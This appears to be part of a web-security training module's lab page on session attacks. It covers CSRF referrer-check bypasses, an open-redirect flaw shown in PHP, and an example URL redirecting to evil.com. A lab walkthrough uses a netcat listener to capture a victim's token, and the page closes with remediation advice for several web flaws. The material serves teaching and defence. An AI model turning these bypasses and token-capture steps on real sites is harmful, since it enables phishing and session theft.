+</code></pre>
+<h3 id="anti-csrf-protection-via-the-referrer-header">Anti-CSRF Protection via the Referrer Header</h3>
+<hr>
+<p>If an application is using the referrer header as an anti-CSRF mechanism, you can try removing the referrer header. Add the following meta tag to your page hosting your CSRF script.</p>
+<p><code>&lt;meta name="referrer" content="no-referrer"</code></p>
+<h3 id="bypass-the-regex">Bypass the Regex</h3>
+<hr>
+<p>Sometimes the Referrer has a whitelist regex or a regex that allows one specific domain.</p>
+<p>Let us suppose that the Referrer Header is checking for <em>google.com</em>. We could try something like <code>www.google.com.pwned.m3</code>, which may bypass the regex! If it uses its own domain (<code>target.com</code>) as a whitelist, try using the target domain as follows <code>www.target.com.pwned.m3</code>.</p>
+<p>You can try some of the following as well:</p>
+<p><code>www.pwned.m3?www.target.com</code> or <code>www.pwned.m3/www.target.com</code></p>
+<p>In the next section, we will cover Open Redirect vulnerabilities focusing on attacking a user's session.</p>
+<h2 id="open-redirect">Open Redirect</h2>
+<hr>
+<p>An Open Redirect vulnerability occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim. As you can imagine, this is possible when the legitimate application's redirection functionality does not perform any kind of validation regarding the websites to which the redirection points. From an attacker's perspective, an open redirect vulnerability can prove extremely useful during the initial access phase since it can lead victims to attacker-controlled web pages through a page that they trust.</p>
+<p>Let us take a look at some code.</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$red = $_GET[<span class="hljs-string">'url'</span>]<span class="hljs-comment">;</span>
+header(<span class="hljs-string">"Location: "</span> . $red)<span class="hljs-comment">;</span>
+</code></pre>
+<p>Code: php</p>
+<pre><code class="lang-php">$red = $_GET[<span class="hljs-string">'url'</span>]<span class="hljs-comment">;</span>
+</code></pre>
+<p>In the line of code above, a variable called <em>red</em> is defined that gets its value from a parameter called <em>url</em>. _$_GET_ is a PHP superglobal variable that enables us to access the <em>url</em> parameter value.</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">header</span>(<span class="hljs-string">"Location: "</span> . $red);
+</code></pre>
+<p>The Location response header indicates the URL to redirect a page to. The line of code above sets the location to the value of <em>red</em>, without any validation. We are facing an Open Redirect vulnerability here.</p>
+<p>The malicious URL an attacker would send leveraging the Open Redirect vulnerability would look as follows: <code>trusted.site/index.php?url=https://evil.com</code></p>
+<p>Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages. Example: <code>/login.php?redirect=dashboard</code></p>
+<ul>
+<li>?url=</li>
+<li>?link=</li>
+<li>?redirect=</li>
+<li>?redirecturl=</li>
+<li>?redirect_uri=</li>
+<li>?return=</li>
+<li>?return_to=</li>
+<li>?returnurl=</li>
+<li>?go=</li>
+<li>?goto=</li>
+<li>?exit=</li>
+<li>?exitpage=</li>
+<li>?fromurl=</li>
+<li>?fromuri=</li>
+<li>?redirect_to=</li>
+<li>?next=</li>
+<li>?newurl=</li>
+<li>?redir=</li>
+</ul>
+<hr>
+<h3 id="open-redirect-example">Open Redirect Example</h3>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>oredirect.htb.net</code>) to access the application.</p>
+<p>Navigate to <code>oredirect.htb.net</code>. You will come across a URL of the below format:</p>
+<p><code>http://oredirect.htb.net/?redirect_uri=/complete.html&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;</code></p>
+<p>If you enter an email account, you will notice that the application is eventually making a POST request to the page specified in the _redirect_uri_ parameter. A <em>token</em> is also included in the POST request. This token could be a session or anti-CSRF token and, therefore, useful to an attacker.</p>
+<p><img src="storage\modules\153\72.png" alt="image"></p>
+<p>Let us test if we can control the site where the _redirect_uri_ parameter points to. In other words, let us check if the application performs the redirection without any kind of validation (Open Redirect).</p>
+<p>We can test that as follows.</p>
+<p>First, let us set up a Netcat listener.</p>
+<p>Open Redirect</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ nc -lvnp <span class="hljs-number">1337</span>
+</code></pre>
+<p>Copy the entire URL where you landed after navigating to <code>oredirect.htb.net</code>. It should be a URL of the below format:</p>
+<p><code>http://oredirect.htb.net/?redirect_uri=/complete.html&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;</code></p>
+<p>Then, edit this URL as follows.</p>
+<p><code>http://oredirect.htb.net/?redirect_uri=http://&lt;VPN/TUN Adapter IP&gt;:PORT&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;</code></p>
+<p><code>&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;</code> &lt;-- Replace this with the token that is assigned automatically by the application.</p>
+<p>Open a <code>New Private Window</code> and navigate to the link above to simulate the victim.</p>
+<p>When the victim enters their email, we notice a connection being made to our listener. The application is indeed vulnerable to Open Redirect. Not only that, but the captured request captured also includes the token!</p>
+<p><img src="storage\modules\153\71.png" alt="image"></p>
+<p>Open redirect vulnerabilities are usually exploited by attackers to create legitimate-looking phishing URLs. As we just witnessed, though, when a redirection functionality involves user tokens (regardless of GET or POST being used), attackers can also exploit open redirect vulnerabilities to obtain user tokens.</p>
+<p>The following section will provide some prevention advice related to the covered vulnerabilities.</p>
+<h2 id="remediation-advice">Remediation Advice</h2>
+<hr>
+<p>Even during bug bounty hunting, it is essential to share remediation advice. Knowing how to remediate a vulnerability does help not only the client but also ourselves since we may quickly suspect the existence of a vulnerability by noticing the lack of a related security measure.</p>
+<p>So dedicate some time to studying how the vulnerabilities you are aware of can be remediated, as this can make you even more competitive.</p>
+<hr>
+<h3 id="remediating-session-hijacking">Remediating Session Hijacking</h3>
+<p>It is pretty challenging to counter session hijacking since a valid session identifier grants access to an application by design. User session monitoring/anomaly detection solutions can detect session hijacking. It is a safer bet to counter session hijacking by trying to eliminate all vulnerabilities covered in this module.</p>
+<hr>
+<h3 id="remediating-session-fixation">Remediating Session Fixation</h3>
+<p>Ideally, session fixation can be remediated by generating a new session identifier upon an authenticated operation. Simply invalidating any pre-login session identifier and generating a new one post-login should be enough.</p>
+<p>As already mentioned, the established programming technologies contain built-in functions and utilize libraries for session management purposes. There is no need for custom implementations to remediate session fixation. Find some examples below:</p>
+<hr>
+<h4 id="php">PHP</h4>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-function"><span class="hljs-title">session_regenerate_id</span><span class="hljs-params">(bool <span class="hljs-variable">$delete_old_session</span> = false)</span></span>: bool
+</code></pre>
+<p>The above updates the current session identifier with a newly generated one. The current session information is kept. Please refer to the following resource for more in-depth details: <a href="https://www.php.net/manual/en/function.session-regenerate-id.php">session_regenerate_id</a></p>
+<hr>
+<h4 id="java">Java</h4>
+<p>Code: java</p>
+<pre><code class="lang-java">...
+session.invalidate()<span class="hljs-comment">;</span>
+<span class="hljs-attribute">session</span> = request.getSession(true)<span class="hljs-comment">;</span>
+...
+</code></pre>
+<p>The above invalidates the current session and gets a new session from the request object.</p>
+<p>Please refer to the following resource for more in-depth details: <a href="https://docs.oracle.com/cd/E19146-01/819-2634/6n4tl5kmm/index.html">Using Sessions</a></p>
+<hr>
+<h4 id="-net">.NET</h4>
+<p>Code: asp</p>
+<pre><code class="lang-asp">...
+Session.Abandon();
+...
+</code></pre>
+<p>For session invalidation purposes, the .NET framework utilizes <em>Session.Abandon()</em>, but there is a caveat. Session.Abandon() is not sufficient for this task. Microsoft states that "When you abandon a session, the session ID cookie is not removed from the browser of the user. Therefore, as soon as the session has been abandoned, any new requests to the same application will use the same session ID but will have a new session state instance." So, to address session fixation holistically, one needs to utilize <em>Session.Abandon()</em> and overwrite the cookie header or implement more complex cookie-based session management by enriching the information held within and cookie and performing server-side checks.</p>
+<hr>
+<h3 id="remediating-xss">Remediating XSS</h3>
+<p>Ideally, XSS can be remediated by following the below secure coding practices:</p>
+<p><strong>Validation of user input</strong></p>
+<p>The application should validate every input received immediately upon receiving it. Input validation should be performed on the server-side, using a positive approach (limit the permitted input characters to characters that appear in a whitelist), instead of a negative approach (preventing the usage of characters that appear in a blacklist), since the positive approach helps the programmer avoid potential flaws that result from mishandling potentially malicious characters. Input validation implementation must include the following validation principles in the following order:</p>
+<ul>
+<li>Verify the existence of actual input, do not accept null or empty values when the input is not optional.</li>
+<li>Enforce input size restrictions. Make sure the input’s length is within the expected range.</li>
+<li>Validate the input type, make sure the data type received is, in fact, the type expected, and store the input in a variable of the designated type (strongly defined variable).</li>
+<li>Restrict the input range of values. The input’s value should be within the acceptable range of values for the input’s role in the application.</li>
+<li>Sanitize special characters, unless there is a unique functional need, the input character set should be limited to [a-z], [A-Z] and [0-9]</li>
+<li>Ensure logical input compliance.</li>
+</ul>
+<p><strong>HTML encoding to user-controlled output</strong></p>
+<p>The application should encode user-controlled input in the following cases:</p>
+<ul>
+<li>Prior to embedding user-controlled input within browser targeted output.</li>
+<li>Prior to documenting user-controlled input into log files (to prevent malicious scripts from affecting administrative users who view the logs through a web interface)</li>
+</ul>
+<p>The following inputs match the user-controlled criteria:</p>
+<ul>
+<li>Dynamic values that originate directly from user input (for example, GET, POST, COOKIE, HEADER, FILE UPLOAD, and QUERYSTRING values)</li>
+<li>User-controlled data repository values (database, log, files, etc.)</li>
+<li>Session values originated directly from user input or user-controlled data repository values.</li>
+<li>Values received from external entities (machines or human-controlled)</li>
+<li>Any other value which could have been affected by the user.</li>
+<li>The encoding process should verify that input matching the given criteria will be processed through a data sanitization component, which will replace non-alphanumerical characters in their HTML representation before including these values in the output sent to the user or the log file. This operation ensures that every script will be presented to the user rather than executed in the user’s browser.</li>
+</ul>
+<p><strong>Additional instructions:</strong></p>
+<ul>
+<li>Do not embed user input into client-side scripts. Values deriving from user input should not be directly embedded as part of an HTML tag, script tag (JS/VBS), HTML event, or HTML property.</li>
+<li>Complimentary instructions for protecting the application against cross-site scripting can be found at the following URL: <a href="https://www.owasp.org/index.php/XSS\_\(Cross\_Site\_Scripting\">Cross Site Scripting Prevention Cheat Sheet</a>_Prevention_Cheat_Sheet)</li>
+<li>A list of HTML encoded character representations can be found at the following URL: <a href="http://www.degraeve.com/reference/specialcharacters.php">Special Characters in HTML</a></li>
+</ul>
+<p>Please also note that Content-Security-Policy (CSP) headers significantly reduce the risk and impact of XSS attacks in modern browsers by specifying a whitelist in the HTTP response headers, which dictate the HTTP response body can do. Please refer to the following resource for more in-depth details around CSP: <a href="https://developers.google.com/web/fundamentals/security/csp">Content Security Policy</a></p>
+<p>Before we continue, let us also remind you that cookies should be marked as HTTPOnly for XSS attacks to not be able to capture them. Bypasses exist, but they are out of this module's scope.</p>
+<hr>
+<h3 id="remediating-csrf">Remediating CSRF</h3>
+<p>It is recommended that whenever a request is made to access each function, a check should be done to ensure the user is authorized to perform that action.</p>
+<p>The preferred way to reduce the risk of a Cross-Site Request Forgery (CSRF) vulnerability is to modify session management mechanisms and implement additional, randomly generated, and non-predictable security tokens (a.k.a Synchronizer Token Pattern) or responses to each HTTP request related to sensitive operations.</p>
+<p>Other mechanisms that can impede the ease of exploitation include: Referrer header checking. Performing verification on the order in which pages are called. Forcing sensitive functions to confirm information received (two-step operation) – although none of these are effective as a defense in isolation and should be used in conjunction with the random token mentioned above.</p>
+<p>In addition to the above, explicitly stating cookie usage with the SameSite attribute can also prove an effective anti-CSRF mechanism.</p>
+<p>Please refer to the following resource for more in-depth details around SameSite cookies: <a href="https://web.dev/samesite-cookies-explained/">SameSite cookies explained</a></p>
+<hr>
+<h3 id="remediating-open-redirect">Remediating Open Redirect</h3>
+<p>The safe use of redirects and forwards can be done in several ways:</p>
+<ul>
+<li>Do not use user-supplied URLs (or partial URL elements) and have methods to strictly validate the URL.</li>
+<li>If user input cannot be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.</li>
+<li>It is recommended that any destination input be mapped to a value rather than the actual URL or portion of the URL and that server-side code translates this value to the target URL.</li>
+<li>Sanitize input by creating a list of trusted URLs (lists of hosts or a regex).</li>
+<li>Force all redirects to first go through a page notifying users that they are being redirected from your site and require them to click a link to confirm (a.k.a Safe Redirect).</li>
+</ul>
+</div></body></html>
